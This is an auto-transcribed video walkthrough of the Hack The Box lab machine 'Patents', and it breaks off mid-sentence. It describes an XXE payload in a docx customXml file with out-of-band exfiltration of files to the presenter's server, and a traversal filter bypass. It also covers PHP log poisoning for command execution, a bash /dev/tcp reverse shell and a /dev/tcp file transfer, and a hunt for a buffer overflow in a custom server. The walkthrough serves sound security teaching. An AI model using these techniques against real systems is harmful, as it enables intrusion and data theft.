 what's going on youtube this is ipsec i'm doing patents from hack the box and just the name is enough to instill rage because i hate patent trolls with a passion and the website when you go to it and realize it's uploading silly patents it doesn't do a good job at changing the thought away from patent trolls thankfully the silly patent you upload to the website you can put some nasty xml in it to trigger and xml any injection vulnerability to leak some source code that reveals a rce in the web server once you get on the box you realize you're in a docking container you do some magic to escalate to root and then once you root on that docker container you can extract a binary of a web server and do some reverse engineering against it to find a vulnerability in the way it handles file names do some binary exploitation magic and you suddenly root on the host operating system it is a really fun box but it is tough it has probably one of the lowest solve rates on hack the box so with all that being said let's just jump in as always we're going to start off with the nmap so dash sc for default scripts sv enumerate versions oa i'll print all formats put in the nmap directory and call it patents and then the ip address which is 10 10 10 173 this can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server and i believe if you googled this with like launchpad it's going to say it's ubuntu bionic let's just google that i meant to say launchpad not ubuntu but it looks like we got it anyways so we can just look at this package and we see it is part of bionic so we have what distro of ubuntu it is it was also down here as well um http is running two four two nine and again if you just search this if you do launchpad hdbd2429 you will also get it is bionic so just a quick way to identify what distribution it is um port 80 is open that is of course http and we got the title which is meow inc patents management and we also have port 8888 open and we get lfm bad request in this banner script so i'm going to go check this out real quick to see exactly what it is and you can see nmap it can't identify the service so this is what it prints kind of just like the potential banner but we're just going to curl 10 10 10 173 quad 8 for the port and an error message http 0.9 and looking at this it's just closing connection so it doesn't look like it likes curl um maybe it's an http server because we're getting an http error message back if we do netcat 10 10 10 173 quad 8 for the port get slash http slash 1.1 hit two ends nothing did i screw something up get slash http 1.1 and we get lfm 400 bad request which is what end map hits all so have no idea what this is going to go over to cherry tree and we'll take notes of this so ctrl n for new node patents ctrl shift n notes uh port 888 lfm unknown service and what we probably should have done is been doing a go buster on the box at 10 10 10 173 to identify other things on this but we just get a website it looks like we're already logged in somehow because we got a name this top right which is odd a few patents clicking around i can't really do anything looking at the source we see some comments there but i can't identify exactly what is powering the site is it wordpress is it joomla what is it i'm just going to press search for php doesn't find anything if we search slash index.html we get this page back if we do index.php nothing found we go to the upload it looks like we can upload a docx file again looking at the source we see the data type encrypt must be satisfied below and we get a max file size nothing too interesting there but the main thing i want to look at is where this form is sending it to and that is convert dot php so upon putting a docx here we go to a php script so let's go analyze this and burp real quick so go to proxy turn intercept on go my foxy proxy switch it to burp suite and before i do that actually we need to get a sample docx so um it's going to google sample.x file file examples.com sounds good to me let's get a docx the smallest one save it and then we can go over to the downloads folder and copy it over so file sample to root hdb boxes patents cd dash to go to my previous working directory and we got a sample file right there so let's upload that so going to upload click browse press ctrl l so i can type a path root htb boxes patents and select this open and i really should be doing go buster in the background so let's do that before i upload this always do recon in the background i don't know why i wasn't http 10 10 10 173 the word list um i'm going to cheat a bit and one of the words i'm looking for isn't in my normal so we're going to do user share set list discovery web content raft and yes i've done this box before that's how i know this because this piece kind of took me a while to find but you should always do multiple word lists don't be dependent on just one we want uh raft large woods probably this is about half the size of the normal word list but i forget exactly what file it had that i wanted but i made note to specifically use this word list so u url word list dash o we'll do go buster dot out and i'll do dash x php because we saw convert.php in the source so we know there's some php scripts here uh forgot it leading slash there we go interesting.php was four or three but let's keep going so we were uploading the document i think i clicked browse specified this turn burp suite on we are intercepting so i click generate pdf we get a burp suite i'm going to send it over into repeater and we get a 200 okay and let's see is it directing us somewhere render and we got a download button so let's see where we can download searching for download it says window location output and then this path so let's copy this go back to burp suite we can drop the request output uh we've got that leading o and output it's not output but click turn off proxy go here and we get this pdf so what happens if i just do that nothing so i was wondering if we had like directory traversal on the server but we don't so this is our sample document that we had downloaded and if this was just straight docx then i would probably be um trying to put php in the metadata or something and trying to get it to execute but because it's doing a conversion to pdf it's going to stomp on all my metadata and things i can put in so i don't think that's going to work i tried putting docx here to see if um that file existed see if i could find it where it's putting it once i upload it can't do that so go back to go buster and we have a few things so let's see we have slash profile uh config.php upload.php so we can take a look at what upload.php is and it looks like it's the same thing except we just have less stuff around it so i'm going to for this and it's still going to convert dot php so both of these look virtually identical uh max file size so this one set the max file size the other one doesn't look like it did unless it's at the bottom but i think max file size may have been commented out yeah this one has submit generate pdf does this have it really well it does so i'm just going to double click up here upload.php and this one will be upload.html and i guess we can take note at upload.php uses max file size upload wow upload.html and php are nearly the same php includes max file size don't know that's important but i mean it's the only difference i'm seeing from a quick eyeball on why they're different and i was going a bit more in depth because if we look at the content length 111723 is smaller than one one one eight four two so if we really wanted to we could probably um grab this let's see v temp set paste wc-c temp 121. uh let's see upload.html what's the size 842. it's definitely uh different than 121 because 723 plus 121 that will be 844. so with two bytes off or two numbers off and that could easily be explained by some carriage return we're adding in this file so chances are we found all that's different or at least all that is added between the two requests if we really wanted to we could copy both requests to a disk and then do like a diff against them but i'm confident that's all that was added so let's see go back to go buster got quite a bit i wish i could hide all these dots first like these aren't too interesting to me maybe like hd axis is configured to 4 3 anything that begins with a dot patents edit profile edit profile looks interesting so let's go over here edit profile turn burp suite off and let's see test test sure yes test test test test test uh so much information to put here i actually don't know what's gonna happen when i add this uh that's why just an anchor so this doesn't look like it's doing anything um we can inspect this save and update and see what it does to see if this is indeed just a rabbit hole to not go down let's see button what do you do button notification what do you do i actually don't know what this button does i thought it would say right there uh form come on where's the submit function for this form control u submit form it's right here i don't know if there's an actual submit function here so we're just going to ignore this because it doesn't appear to be doing anything i guess the easiest way is send it to burp suite click it a bunch go over and see if it sends anything and it doesn't chances are this button goes nowhere so that's probably a rabbit hole we have this output directory and release directory let's start with release output oh we know what output is we that's where the pdf went so let's go look at release let's see go buster dash u htp 10 10 10 173 slash release uh we need to put this in der mood and dash w for wordless let's go grab the same one and we could do x php but i'm not going to because what i'm looking for is not php and it will be much quicker if we don't let's see ht access let's try changing the threads let's see default is 10 let's go crank it up to 99 and pray we don't get many error messages because i hate errors probably could have like edited this word list to remove everything that begins with a period uh let's see i'm gonna kill this one maybe this will speed up and we probably should have done an out file and then we could have just uh excluded everything that begins with a period but i'm going to speed up the video and we'll let this run okay and we had the one word that was not included in all the other word lists and normally used the dirtbuster one it is update details and this one was key to extracting a hint to do this box and even with this hint it probably took me like an hour and a half to understand what this meant so going to update details in the release directory we get a change log and there's a few things that are required or key in this out of the ability to include patents still hidden but still experimental it's hidden that's not too important to us right now i'm also going to copy this into cherry tree because this is a pretty big piece release notes change logs and custom applications are always a good thing to get so uh removed meow fixes they were not real fixes okay and in version 1.1 oh never mind i don't know i was going with that fix the following vulnerabilities directory traversal lfi so it looks like we probably should have been ready reading this bottom up but in 1.0 they fixed a few vulnerabilities and then they removed the fixes because they weren't real fixes and then they added ability to include patents okay let's see two minor fixes fix two vulnerabilities the doc x two pdf so maybe a external library dot x2 pdf is ready changes for the custom folder should work now enabled entity person in the custom folder and docx so the key pieces are we got a docx converter this goes from docx to pdf we kind of knew that but they have entity parsing and this is like an xml thing and the custom folder and docx contains a folder called custom html or it may contain a folder called that and that's we're going to put this but a little bit of research that i went down to find this i'm not going to show absolutely everything because again this was a rabbit hole that took me a lot of research to figure out and it's not probably that interesting we just will get to the results the very first thing i googled was a docx pdf i think that was the library it mentioned doc x2pdf um xxz vulnerability and the reason why i'm going to xxe is an uh any injections and i looked at this first this black cat talk going to docx and let's see i kept trying to poison this file word document.xml and that was not working for me so they're just putting xml entities in this file and when things parse it it triggers the vulnerability that wasn't working for me um i further googled i think like custom xml because they mention custom directory and let's see what is it should be one i ah this one docx4java.org um around here it talks about custom xml item1.xml so this is the one we're going to work with um it's using docx4 this is a slightly different framework i think because it's talking about java we're using php but they're behaving the same so custom xml item1.xml is the file we want so the next thing to do is payload all the things and we need to go to xml and the injection oh google told me exactly what i wanted sometimes it's scary when it does that and there's way too much let's see [Music] this looks good xxe out of band with dtd and php filter so what this is doing is let's see let's see if i get a more simple one first because you probably wouldn't jump straight to like a chain right away so let's try this blind xxe first uh this is meant to use with burp suite collaborator won't work for hack the box because this is just a cloud instance so we'll replace this url but let's go and move this file sample into a well let's not move it yet let's go into this directory and unzip file sample and if you didn't well you probably would have just wrote a bunch of files to the directory where your current working directory is because that's where it unzips to so let's make dur custom xml and v to make item1.xml set paste paste this in and we want entity to be http 10 10 14 2 uh slash please like this video okay so what that's doing is saying the entity ext is located at this uri and then right here it's telling the person to go pull this variable so that's essentially what it's doing uh we can save that and the key thing here that a lot of people probably make a mistake is they go back and do like zip down dasher and the folder you want to be in this folder when you do the zip because if you don't then your file structure is going to be zipped as like uh folder slash word slash setting dot xml and that doesn't work so zip dash r to go recursive and then we'll call this sample.docx and then star to include everything so now we got a word document let's move it up one directory and let's do python3 dash m http dot server i don't think i put it on 8 port 8 000 so i'm just going to put it on 80. and let's upload this document so let's go to upload.php i'm choosing this one not the html because it has an extra argument and having more arguments is generally better it means it may work i don't know click generate pdf can't upload file say what file sample.docx microsoft ooxml file file sample okay let's try the other one at upload html come on browse there we go sample.x upload it's uploaded and we get a hit back so i definitely wanted that one um we get a 404 because this file does not exist on my computer and whenever you start a web server always start it in a directory called like dub dub dub because if you had anything sensitive in this directory someone hitting it could have just grabbed it so i make the directory dub dub dub and we'll go continue but that file didn't exist so at least we know we can make it call back to us so now the thing is we have to extract data and that's where we're going to go to the next one this outer band attack with dtd and php filter php filter is doing the convert base64 encode which is going to be key because this one is putting the um data x field in the url so if you didn't do this there's a lot of bad characters like line breaks that may not translate to a url that just kill it so base64 is going to make it url friendly so we can do this so let's go back to our word document it's over here go into sample vi custom xml item one and we're going to delete this go to set paste put this in and let's see the entity we want to grab is 10 10 14 2 and i'm just going to go do um please subscribe xml actually we'll make this a bit easier to read um let's see get file to xfill dot xml and let's see sp param1 that looks fine uh param1 is going to be defined and get file2xfill.xml so we can copy this and go to our www directory create the file get file to exfil.xml and copy this one paste it in let's see do 10 10 14 2. and we don't need dtd.xml we can just say data and right now it's trying to get etsy passwd that's fine so let's look at both of these real quick and explain what's going on here so the very first thing is the web server is going to go and query this url url git file to xfill.xml and it's going to pull the variable sp which is this and then param1 and pram one is in this file and it's going to say hey go send data to 10 10 14 2 and data is already going to be the base 64 of etsy passwd so kind of jumps in a bunch of different places starts here uh gets this param1 variable then it populates param1 gets data whatever um may make sense once we run it hopefully it makes sense let's see one day i'll have my tablet wacom thing up so i can draw on the screen and draw pretty lines but that is not today let's see we got to upload the document so we just edit it let's do the zip command again zip dash r we'll call this hexfield.x mv exfil docx up one folder and we can just go here upload pattern click browse expo docx we have a web server running generate so we ran git file to x film.xml and then it gave us some base 64. so let's exit that and copy this base64 and see what it was and i'm sure if you search on ipsec.rocks for xxe i think i wrote a python script that will actually automatically do what i'm doing manually here but we got a lot to do in this video so i'm not going to go there i'm just adding a uh semicolon echo so we have a clean line break and we can see the pass wd of the server and there's a user gb gb yolo so let's see notes we'll call this vons i guess xxe and docx custom xml item1.xml so now we can get files we did have gobuster tell us there was config.php and if we looked at the source code of this upload it's telling us config.php here as well so we probably want to go grab config.php so the very first thing we do is edit the file and dub dub dub to be the config.php so be ver dub dub dub html config.php now let's go we should probably um send this to burp sweet so we can just hit something to send this again i wonder if i turn this on resend intercept was off that's not it that looks good xxe okay just got a file and it didn't give us any results so let's change this back to etsy passwd and see if it worked did we screw anything up let's see passwd save send look and we get it so there's probably um the web root not where we're expecting it so let's try grabbing index.html verb dub dub html index.html save we can hit enter a few times send this and we get nothing so it's looking like whoa 10 11 10. that's weird i think 10 11 10 173 i honestly have no idea why it's saying 10 11 10 but okay i'm just gonna ignore that for now um so maybe there's a different uh dub dub dub root so let's go uh let's do etsy what is it do we have etsy apache 2 sites available 0.0 default this would be like the web configuration oh so see if this file exists send oh i have a percent okay we have a file echo dash n base64-d i don't know if they actually did anything but oh well um document www.html.x2pdf so this is the document root so let's go back and edit this resource and this is why we're doing the chain because if we didn't do the chain between grabbing a file and then replaying it we'd have to be editing a docx every single time and re-uploading it so i always like having this as kind of a pivot point for www.html this config.php send it and now we got a file back so let's go copy i think fulcrum was the machine i said ipsec dot rocks with xml dtd uh xxe injection i think it's fulcrum but ipsec dot rocks doesn't lie so let's see needed by convert.php upload directory let's go needed by getpatten.php which is moved to get patent underscore alpha v 1.0 because it's vulnerable um i'm going to go straight here because it's vulnerable it could be a honeypot because normally things don't just fall out of the sky like that but i am excited to check this one thing out looking at this here you can find your submitted patents read your patents using question mark id of your patent id equals one let's make water boil two well it's so easy to clone sim cards let's go davinci go whales are dying i'm tired of ip protocol and that looks like all the patents uh let's try one single quote just trying basic um sql injections and doesn't look like we're getting anything let's see slash patents so let's do slash patents slash one so these look like they are files so let's try good old directory traversal so pipe it to burp suite send it go to proxy repeater we send one we get something 4728 request link let's go a bunch up etsy passwd and don't really see anything um one thing in directory traversals is they don't go maybe it's recursive i forget the word but it doesn't happen multiple times so what i mean by that is if they're not checking to say hey this url is bad actually we can probably test this let's just do a bunch of that and then one and what do we get let's make water boil so we can see it's not um erroring out it's still displaying this file so what it's probably doing is removing all dot dot slashes and if it's not recursive meaning it doesn't happen multiple times then if we remove dot dot slash here then we'll be left with dot dot slash right so see do i have a find and replace uh edit where is search and replace don't think i have it we can probably do it in vi so what i'm saying is if we do percent s dot dot slash and remove it that did not do what i expected percent s dot dot backslash so that's one slash that ends it there we go so i just removed dot dot slash from that and it left me with the traversal that's what i mean by like happening multiple times so let's try this so go back here replace click raw and we probably have to have etsy pass wd again right at c pass wd because one does not exist at the root of the directory and we get a file look at that so now we can extract files from the system um with this we can try um creating an uh reading log files so we can do like ver log is it apache2 access.log maybe it's httpd uh my burp suit just tongue on me okay htpd is this a file let's see patchy two oh god it's huge because it didn't hit it hung because this file is so big because of go buster um let's see let's make sure we are not go bustering it anymore we are not let's i wonder if we can go to like a file handle if that would be better lfi so let's go proc self fd0 fd1 2 we can probably just put this in the url be quicker because we don't have like an automatic render let's see this i can rip sweet off go let's see script unable to start doesn't look good three four five these are just file descriptors of the process seven it doesn't look any smaller than the log i was hoping maybe for some reason this would be truncated but it's not but we can do log file poisoning because this is displaying variables that we control we can't use the url because this is actually going to be html nd encoded so if we put like a bracket in the url it's going to translate it to like and gt semicolon which prevents this however it doesn't do that for all fields specifically like the user agent so if we put any user agent we want in here so we can say please subscribe and then refresh this page go to the bottom maybe it's quite a bit we got the user agent please subscribe so what we can do and you always have to be careful doing this in the user agent because if you make bad php code um the server's gonna just hang up and never talk to you again we're not the server this lfi won't because you're poisoning the log and if you kill the log by putting a syntax error in it's not going to read what's after that syntax error so you'd have to revert the box or something so super annoying so we'll do php system then request and the variable we want is we'll call this please subscribe space and again double checking everything semi parentheses there so php system request single quote single quote and bracket and prints it's looking good i'm feeling confident about this send it okay now let's add the parameter by doing and please subscribe is equal to who am i and hopefully we'll get a dub dub dub data or whoever the server is running as there it is and i think the server died after that maybe oh no it's got the carriage return afterwards so now we can execute commands on this box let's try a reverse shell holy crap so much memory is used on this one tab that's why i want to go to a shell immediately so i can stop going here or get off the page normally i'd go play and run a few commands to see exactly what type of shell i'm in but this we're just yellowing it so lvmp 9001 and let us get this this piece doesn't matter and what i'm going to do is we'll do oh wait that piece does matter because this includes the file uh we're going to convert this to a post request so the cool thing about how php handles post is if the variable like [Music] is get even though it's a post request if you just put it up here it's going to treat that as a get variable so super handy to do that this needs a question mark and i think right here so we'll do um please subscribe is equal to who am i and i'm gonna run this one more time uh it's fd seven and it's going to take burp suite a while to process this because it's such a big request and then we'll go about down the bottom and look at www data to make sure it's working [Music] 57 i knew i was gonna regret typing this [Music] yeah this does not like me um let's just do ping which uh ping dash n1 127.01 dash c1 okay we want dash c 10 10 14 2. it's a quick way to test if it works tcp dump dash i ton xero icmp i don't think it worked copy it up here see do not it's possible that the box doesn't have ping which is unlikely but not unheard of so we'll do ncl we'll just try over shell bash c i dev tcp 10 10 14 2 9 000 1 0 and 1 looks good url in code send and i may just revert the box to make this log a bit smaller which would make it a bit easier to work with there's maybe other places we could lfi to i'm just not positive yeah so let's revert the box real quick so i'm gonna pause the video revert the box and we'll come back to this so the box should be reverted um if i go back to this lfi we can look at this access log was it httpd or maybe the log is just empty it was just empty so we got my user right there my user agent so let's put this in then let's change this out i would do please like this video as a user agent uh let's see we can change this to post and we can do please subscribe is equal to who am i and we should see let's see access log please like this video as this user agent might just search for www data not found let's see let's make this a 404 that's easy to find um poisoned request this will be this php system request or equst please subscribe should be good see right here should be the system command i think or who am i let's do and please subscribe equals who am i i'm gonna laugh when i'm just have a typo somewhere okay at work there maybe i need a blank line i have my enter that's a i'm honestly not sure his poison request and it's not seeing it so i'm just going to do this all in the url because for some reason it's not liking me you do it down here oh we can leave that there i guess yeah prison request nothing there so and please subscribe equal who am i dub data so let's do a reverse shell right here i dev tcp 10 10 14 2 9 000 1 0 and 1 and that let's you all in care of this we're listening and we got a shell so we probably waste a lot of time just trying to do it in a post because i hate doing things in the url if i just did in the url it would have worked immediately not sure exactly what's going on there um but look at this i think it should have worked but i'm sure if you read the comments someone will find out and put it there so now they go to shell let's upgrade or tty so python c import pty pty dot spawn then bash control z stty raw minus echo f g enter twice you won't see yourself typing but once um you're done it'll be good then the next thing i want to do is export term is equal to x term so now i can clear the screen so we can perk around here see what is available to us if we go to slash home oh we got gb yolo user.txt wc-c we could re oh only root can read this one lsla slash and we see we're inside a docker environment so uh we could try running lin p's against this and see what we find uh let's do actually this video is getting pretty long let's just analyze file dates so we do ls la here we can see this directory was created december 3rd and user.txt was created may 22nd um i'm going to search the box for files in december if we don't see anything interesting we'll search for may so we'll do find slash dash newer mt oh what i just pasted and we'll probably have to fix the rows and columns uh sty a actually do this s-t-t-y dash a does this change rose nine now that changes shoot we'll just do this to be rev shell and because the rose changes i don't want to change the window size too much because it could screw up the tty so that's why i'm just going to rename that and this one will only be the reverse shell let's see rose 37 calls 146. stty rose 37 carls 146. and let's hold f and it looks like we can now go across lines and then just um screw us over uh let's do that find if you go back like two minutes you'll see me typing the command and then like the command hits wherever it thought the end of the terminal was and restarted at the beginning so we'll do find slash dash newer mt we'll say december 2nd 2019 and not newer then december 4th 2019 to devnl and we probably should do i always like ls let's see we probably don't need well right off the bat we see user source lfm so ls user source list user user source cd lfm mission denied so let's own by root so this is probably happening after we get a privesque so let's do this finder command again and we'll grip dash v slash usr um let's see we have opt checker client lsla and we can't go into check a client but we do see checker underscore run and if we look at the date that's may 15th this minute so it looks like something is running something in here every minute so the way we can figure this out is running a program called p spy so let's go p spy github and let's see i think they have releases 64 s probably what i want save it ls oh whoops ls downloads peace buy we gotta copy that and we'll copy it to dub dub dub which i don't think we're still running that dub server oh no we are that's down here so we can now which w get which curl we got curl so let's go to dev shm and then we can curl 10 10 14 2 slash piece by s i think it was dasho p spy hey that was right sage mod plus x to make it executable permission denied if we look at mount and grip for shm we can see it's got no exec so we have to move it somewhere else we can probably do just temp so move p spy to temp dot slash p spy dot type less p spy oh 404 i did not have that right let's go ls dub dub dub piece by 64 s that's what i missed curl 10 10 14 2 0 piece by chmod plus x run it and this is just going to moderate for new process that iran we know acron runs probably every minute based upon that um file date on that running script and slash opt so i'm just going to let this go and we'll see if it shows a new command uh let's see right here we have n password gby l0 rocks and this run file so we can copy this and do let's try su paste that password in and we have root now on this docker container so let's go here creds root and this will be docker got this from a cron just taking notes how i get it so now we are root on this box uh let's go to cd verse bull cron and i want to look at exactly what this cron was so we see it running every minute saying the password and going in this opt checker oh there's also that um was it user source lfm directory want to go to so there's two things we want to do um the find command found that lfm directory a few minutes ago so cd opt checker client and we got checkered up pi oh if i don't have v do we we do not um let's just do maker transfer cp-r op checker client here cp-r um user source lfm and we're just going to copy these files so tar dash cjvf transfer.bz2 transfer and that lfm directory looks like it is a git repository but now do we have nc of course we don't um cat transfer to what is it dev tcp 10 10 14 two nine thousand one nc lvmp 9001 i'm gonna try qp maybe this will terminate upon file transfer transfer.tar.bz2 nope no it exited cleanly so let's do tur xjvf transfer a bunch of time stamping in the future so i guess the time on the server is off uh time summer is off probably because it's utc time and maybe turd didn't take account for that so i don't know osla uh or maybe the server time's off i don't know but now we can have them and edit this better um but exit that and do a new pane because we have the tty and that rev shell set for a specific number of rows and i don't feel like messing with that so look at chaka.pi and we see an ugly script it looks like input request check lfm user password and it's getting user and pass from i don't know oh rxv okay couldn't find password phone not found lfm so remember on port 888 this looks like it's going to be the same thing new format base user cat cron job so that's the password cat run file date to checkered command a check could run so the user the password is going to be this and then the file and they're doing convert.php so if we wanted to i guess we could do dot slash run file i don't know where this oh 10 100 188 um we probably got to change that so this will be 10 10 173 and we can just export the password this way and doesn't look at what wants to run python checker dot pi 10 10 10 173 888 lfm server underscore user password is going to be gby 0l 0 or 0ck dollar dollar bang and the file is going to be [Music] www.html.x2pdf i wonder if this is trying to pull it locally couldn't find such password it's by pulling it from the environment variable uh i'm just going to move on from this little piece the key thing is it makes these variables so i bet we can just uh print oh this is python 2 input request okay let's see this will be called http custom and this will be check were there other ones in this input request that's real request so there's a get and that's just get and then two line breaks is there a post put okay so get slash lfm uh user we know this is going to be what was it lfm server underscore user most likely and password is going to be this okay and this obviously is file is there anything else in check so input request oh we got a third [Music] so line line is it two accessories and backslash our back session so two line breaks and then what is the third input rec searching md5 sum so that's probably it so let's get the actual binary let's look at that lfm directory and we just got a get so removed files this repository is on subversion so let's go back to this com git commit so get reset hard this thing and we have the server and a readme so if we cap the readme it's saying lfm was compiled against and none of this information is actually important you could use this to pull glib c but i'm going to show you a way to identify glibc anyways so we're just going to ignore this readme file pretend it's not here lfm server let's copy it out of this and let's look at the other gets so let's go back here get reset hard nothing here get log let's go up one more get reset there's probably a command better to do this but we get a bunch of source code so make dur dot dot slash src mv stir oh not mv because we'll uh move get cp we'll do dash r star dot dot slash source what's in files try try me oh no that's a file okay cat log lfm protocol management get i bet we can just do get diff on this see oh here is the structure lfm is lightweight file manager protocol so let's see let me just paste that in added main file get different looks like they're adding comments but i think we got enough from uh get to do some work so let's make the exploit dev move lfm server in this and i'm going to move transfer source and exploit dev as well so if we execute the server ss lnp i think it said like default port was 5000 and we curl localhost 5000 we're getting the same response we had before uh nc localhost 5000 get slash http 1.1 lfm bad request so this is what we saw before on um port 888 on the server so fairly confident we got this so i'm going to analyze this in ghija and we'll see exactly what this binary does i have giger installed and up ghidra so just running the gauge or run and probably should update it look like december 2019 but we should be fine uh let's do click on this little dragon guy and then we'll open up the binary file import file pat tense exploit dev lfm server okay uh yes analyze and i always select all i don't know if that's a smart thing or not it's just what i generally do i'm just waiting for the bottom thing to finish while it does we can go to maine let's see where are we entry it's not what i want where is maine you just go to decompile for entry and if we click right here this function should be main so double click i'm going to go here hit l and call it main and looking at the decompiled output i have the disassembled view down here and we also have defined strings um let's see what is this doing pram 1 is equal to 2 3 5 and that's saying port number so what is [Music] param1 i'm guessing this is arc v so if it's two if it's three if it's five this is count and two would be like dash something space something so that's why it's going up in twos so i'm going to rename param1 to be argv here okay if arc vs2 they're all calling this same function so we go in here and kind of see what this does invalid port number uh so this might be if there's two if there's three what not um easy way to identify this and we're gonna do it both ways we're gonna do it through gdb if we didn't have the source but we have the source right now so we can just see exactly see what this function is so let's go in the source scrap dasher oh not pram1 invalid port number this is erg pursing so if we vim or persing.c this function is called check option probably you can see what the source looks like here and then what the decompiled output looks like here so let's rename this to be erg underscore parsing i always like putting in caps okay and now if we went back to main uh there's our pursing go back here you can see what it's doing and they can also see if we go in here we could go and rename what each argument is so dash p is port number dash l is a log name so if we wanted to we could do lfm server dash p 8000 or it listens on 8888 and ss lnp grep lfm we can see it's now listing on 888 so that's not too handy for us we can search for defined strings if you don't have that window you can go to window defined strings and i'm going to search for search for the password exclamation point gby and we can see the password is hard coded into this binary if we do control shift f to follow we get this screen and we can see it's used in two different parameters so we can take a look at it and try to guess what this does so an undefined function whatever this is and right here it's comparing something to the password as comparing something to the user so these are the hard-coded username if we uh let's see will this tell us edit if we double click it oh hold it on and we can see that is equal to lfm server underscore user probably should be a better way to see this zero zero four zero nine let's do lfm server user using parameter right here i don't know this is going to be the user this is going to be the password uh apu stack 2 not sure exactly what this is so we could again cheat and go to the source code so if we go to the source code grab r gby star doesn't exist uh let's see them let's do grep dash r check lfm.c function url d code to do so looks like this is an incomplete source we don't have everything so we'll actually have to analyze this so we can do gdb dot slash lfm server and with web servers you're always going to want to set the follow mode uh follow fork mode to child because it forks off each like thread that handles your request we can do run and i'm just going to always use quad 8s for the port so it makes it easier to translate when we actually exploit the server instead of locally so control c to background and let's go take a look at this so iver is equal to string compare apu stack so we can just take a look at string compare call 403 b50 break 0x43b50 continue and now we have to make that request so let's go into exploit dev and let's create our exploit.pi script first thing we're going to do is from pawn import stir and we'll do def build request and we'll call this um file i guess so first thing we want is this so we can do line is equal to this we'll call this request request okay and this one i think i should do double quotes i don't think it matters that much but when it comes to doing this i love double quotes file these need be plus equals there we go we need backslash backslash n this was 2. we'll just do rec plus equals like that and rec plus equals um md5 sum of the file so let's v we'll call it convert dot php just leave it blank md5 sum convert i did not save it md5 sum convert php and we can put this here okay now we can do rec is equal to build request and we'll call this convert.php and i just want to print this out real quick python3 exploit.pi this is why i always like printing things out because i forget things that looks good so now we can have this script connect so we'll do [Music] r is equal to remote localhost 888 r dot send request r dot receive line and we'll do this a few times to get all the lines python3 exploit.i and doesn't look like it worked so let's see is that an l or a one let's go back to the source g b y i can just copy current column we'll paste this send i wonder if there's a um new line after the hash there we go so now we broke um i forget where we are breaking so we can do info b and we are four three b fifty we're breaking right here so doing a string compare this stack and this and rdi rsi and rdx are all uh gby zero l whatever rocks we can continue uh program's not being ran it's weird oh the thread probably died uh always when you do this um ctrl c and then run it again uh do control c and c if you don't i found it doesn't always follow the thread so let's change the password to something else whoops change the password to hip sec run this again and we can see the very first argument in the string compare is ipsec so this apu stack is probably going to be um we'll call this the http request and two this is probably actually a structure in the source code and this is like the second item in it so now we've got http requests labeled there we don't know what this one is ivar ii but it's comparing against the user so chances are i've r2 how it's being used is going to be um the return code just based upon this like we're doing a string compare so it's either going to tell us it's compared or or it's identical or not and then we're doing pretty much boolean comparisons with this with zero negative one so i'm going to put this as return code okay pram one this is probably going to be the username but we can check this so if we go to the string compare 403 b2b so continue oh didn't crash this time uh break start 0x 403 b2b continue run it let's see breakpoint which one well 403 b to b and comparing lfm user so what we should have done is change that to be upset again we'll call this i would say please subscribe okay and the very first argument because again the first argument in 64-bit is rdi all right then rsi is the next and rdx is the third but is the third i forget but anyways rdi is the very first argument in uh calling things so it's calling string compare the very first argument is please subscribe this is the user so i'm just going to rename param1 huh i don't like how that http request 2 is equal to this where else is user this used pram one yeah we don't have to be exact we can just call this user upper two question marks i know that's not because of this one or maybe the assembly is wrong but decompiling for the sake of request uh ease of understanding so if our user matches and her password matches then we go down here and we're going to go in this function and what is this going to do so it's going through each character and if the character has a percent it's going to call string to ul and this is just going to be a url decoder so if you wanted to search the syscall oops i bet the man page will work it's gonna google it but let's try man here we go convert a string to an unsigned long integer so essentially that's where the two numbers are after the percent is just an n so it's doing a decode so we can go back to where were we uh control f now this pram we should probably rename this function figure out what this is real quick we'll do that next but i want to go return code right here is going to be url decode okay let's say not found so access local a8 for you can do the same thing this is definitely going to be file name it's checking if um i forget what access mode 4 is i think that's read man access see does this tell me the moods i search for no but the mode specifies either read okay right okay or x okay so it's checking if we can read that file and if we can't it does a 404 but let's figure out exactly what function we're in so i'm going to go click on the incoming call to go up one and let's see that's not where i thought i was going to go i have no clue where i went sgn dupe 2. i shouldn't have renamed that user uh let's see i think that's where i am but me renaming user globally is confusing me i think we're here so this is not um that this will be request and we'll call this message so the message is going to be in the request if that makes sense but now let's go up one and this looks a bit more familiar so if request is zero here looks like it's terminating and this function we can look at it what is this doing error allocating structure for message reading of message writing so this is definitely going to be some type of error and this is probably going to be in the source click here if we go exploit dev source it's in lfmc and this is where we are we're in message read and what it's doing right here if p is equal to null exit [Music] then see we message struct maybe that's not it is it multiple times no read message some reason this does not look like the part i'm thinking oh yeah because i was probably looking at send bad request that's where i was so if we look at this this error allocating has probably got a chain from that it's in read message but this is where we are um this is getting purse method so f124 these are going to be the handles so let's see uh request10 we can probably just look for strn dupe this would be a better way to search for it here we go here's the source code for looking at it's handle lfm connection uh sorry doing reversing on stream is just tough especially when like i'm not super familiar with everything but no we can so this is the source to that um we got check get put here and that is uh these things uh this one two and four if we look these aren't in quotes so it's a variable if we go into probably lfm.h check one get to put four one two four so this is going to be handle check this is going to be handle get and this is handle put so we go into handle check and let's keep going through this we got file name at 128 in size so let's highlight file name and see where it appears in here it was in the url d code if i remember correctly where is your ld code file name and just search for url there we go sometimes reading is hard so euro d code it's taking message 2 and putting it into file name and message two let's see oh that's message two um z plus zero x sixteen this is plus 0xc so this is a different one um like if it's a structure think of it like this do we have this think of this as zero uh one two like if it's a list it's kind of behaving like this i guess or um 0xc is here i don't know it's hard to explain it i guess uh we may be able to set a break point and look at it let's do 403 b8d so c b i will do info b let's delete one delete two b star zero x uh what is it 403 bhd okay see run this oh let's put the correct user and password in now we hit it and we can see uh we're passing oh filesconvert.php we forgot there may be like a document root so we probably have to go in there because this is just going to error out probably return like a 404 or something or maybe it just dies completely because the directory doesn't exist so let's make the files and we can v touch files convert.php and rerun this so that's probably why the program was crashing earlier because it was trying to go into that directory and couldn't a breakpoint's still set and we're here so if we look at this we know message 2 plus 0xc this is going to be a file name so it's taking this and then pushing it to this variable and this doesn't have a file size and this is defined at 128 so we're taking something that we have an unrestricted amount of space in to something we have a limited amount of space and we're overflowing that buffer because the buffer is only 128 and i bet if we put like 512 here we can get a crash so let's try this so we already have our exploit script exploit.pi so let's say file is going to be ah we'll do this yeah a times 512. it's only 128 so probably shouldn't need that much but let's see what happens breakpoint hit we're requesting dot slash files a bunch of a's continue and it didn't work program's not being run let's see let's redo gdb get this to a clean state set follow fork mode child run port 8888 okay control c c run it exited shouldn't be exiting let's see oh so what's probably happening is let's see where's that access so before we can actually trigger it because we overflowed it 